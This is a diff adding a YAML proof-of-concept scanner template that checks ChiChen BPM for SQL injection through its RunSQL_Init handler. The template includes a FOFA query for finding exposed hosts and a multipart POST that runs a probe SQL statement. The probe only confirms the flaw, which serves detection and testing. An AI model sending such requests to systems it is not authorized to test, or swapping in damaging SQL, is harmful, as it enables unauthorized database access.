@@ -1,0 +1,26 @@
+id: poc-yaml-ccbpm-runsql-init-sqli
+info:
+  name: 驰骋BPM RunSQL_Init SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 驰骋BPM
+  fofa: icon_hash="-1564380241" || body="正在登录流程&表单引擎设计器,请稍候"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /WF/Comm/Handler.ashx?DoType=RunSQL_Init
+  headers:
+    Content-Type: multipart/form-data; boundary=----123128312312389898yd98ays98d
+  data: '------123128312312389898yd98ays98d
+
+    Content-Disposition: form-data; name="SQL"
+
+
+    SELECT md5({{.t1}})
+
+    ------123128312312389898yd98ays98d--'
+  expression: "status_code == 200 && \ncontains(body,t2)\n"
+transport: http
